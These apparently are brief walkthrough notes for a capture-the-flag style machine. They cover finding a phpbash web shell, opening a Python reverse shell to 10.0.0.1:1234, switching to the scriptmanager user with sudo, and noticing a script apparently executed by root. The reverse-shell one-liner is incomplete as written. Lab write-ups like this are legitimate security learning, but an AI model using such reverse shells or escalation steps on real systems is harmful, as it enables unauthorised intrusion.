
# enumerated the http server, found the /dev directory which has phpbash.php file that runs shell codes

# gained shell using python reverse shell command 

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))
```

# www-data has sudo privileges which it can switch to scriptmanager

```shell
sudo -u scriptmanager /bin/bash
```

# /script directory on the machine has test.py and test.txt on where it seems like the python file was executed by root since it creates a file test.txt which was owned by root, test.py was owned by scriptmanager user

